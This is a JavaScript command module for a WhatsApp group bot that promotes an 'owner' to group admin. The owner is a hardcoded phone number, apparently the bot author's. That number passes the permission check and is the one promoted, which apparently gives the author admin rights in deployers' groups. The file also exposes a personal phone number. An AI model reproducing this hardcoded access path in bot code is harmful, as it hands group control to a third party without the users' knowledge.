import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { sendInteractive } from '../../lib/sendInteractive.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const OWNER_NUMBER = '254716637803';

const _num = (jid) => (jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');

const getOwnerLidNum = (client) => {
    if (client?.user?.lid) {
        const l = _num(client.user.lid);
        if (l) return l;
    }
    if (globalThis.phoneLidCache?.has(OWNER_NUMBER)) {
        return String(globalThis.phoneLidCache.get(OWNER_NUMBER)).replace(/\D/g, '');
    }
    try {
        const fwdFile = path.join(__dirname, '../../Session', `lid-mapping-${OWNER_NUMBER}.json`);
        if (fs.existsSync(fwdFile)) {
            const raw = JSON.parse(fs.readFileSync(fwdFile, 'utf-8'));
            if (raw) return _num(String(raw));
        }
    } catch {}
    return '';
};

const findOwnerInGroup = (participants, ownerLidNum) => {
    return participants.find((p) => {
        const pPhone = _num(p.phoneNumber || p.phone_number || p.pn || '');
        if (pPhone === OWNER_NUMBER) return true;

        const pId = p.id || p.jid || '';
        const pLid = p.lid || '';
        const pIdNum = _num(pId);
        const pLidNum = _num(pLid);

        if (!pId.endsWith('@lid') && pIdNum === OWNER_NUMBER) return true;
        if (ownerLidNum && (pIdNum === ownerLidNum || pLidNum === ownerLidNum)) return true;

        if (pId.endsWith('@lid') && globalThis.lidPhoneCache?.get(pIdNum) === OWNER_NUMBER) return true;
        if (pLidNum && globalThis.lidPhoneCache?.get(pLidNum) === OWNER_NUMBER) return true;

        return false;
    });
};

const fmt = (title, msg) => `╭─❏ 「 ${title}」\n│ ${msg}\n╰───────────────`;

const retryPromote = async (client, groupId, participant, maxRetries = 4, baseDelay = 1500) => {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            await client.groupParticipantsUpdate(groupId, [participant], 'promote');
            return true;
        } catch (e) {
            if (attempt === maxRetries) throw e;
            await new Promise((resolve) => setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1)));
        }
    }
};

export default {
    name: 'powner',
    aliases: ['promoteowner', 'makeowneradmin'],
    description: 'Promotes the owner to admin',
    run: async (context) => {
        const { client, m, isBotAdmin, Owner, itsMe } = context;
        await client.sendMessage(m.chat, { react: { text: '⌛', key: m.reactKey } });

        if (!m.isGroup) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, fmt('POWNER', 'This command only works in groups.'));
        }

        const senderNum = _num(m.sender);
        if (!Owner && !itsMe && !m.key?.fromMe && senderNum !== OWNER_NUMBER) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, fmt('POWNER', 'Only the owner can use this command.'));
        }

        if (!isBotAdmin) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, fmt('POWNER', 'I need admin privileges to perform this action.'));
        }

        try {
            const groupMetadata = await client.groupMetadata(m.chat);
            const participants = groupMetadata.participants || [];
            const ownerLidNum = getOwnerLidNum(client);
            const ownerMember = findOwnerInGroup(participants, ownerLidNum);

            if (!ownerMember) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return sendInteractive(client, m, fmt('POWNER', 'Owner is not in this group.'));
            }

            if (ownerMember.admin === 'admin' || ownerMember.admin === 'superadmin') {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return sendInteractive(client, m, fmt('POWNER', 'Owner is already an admin.'));
            }

            const targetJid = ownerMember.id || ownerMember.jid;
            if (!targetJid) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return sendInteractive(client, m, fmt('POWNER', 'Could not resolve the owner JID in this group.'));
            }

            await retryPromote(client, m.chat, targetJid);
            await client.sendMessage(m.chat, { react: { text: '✅', key: m.reactKey } });
            return sendInteractive(client, m, fmt('PROMOTED', 'Owner has been promoted to admin.'));
        } catch (error) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, fmt('ERROR', 'Failed to promote: ' + error.message));
        }
    }
};
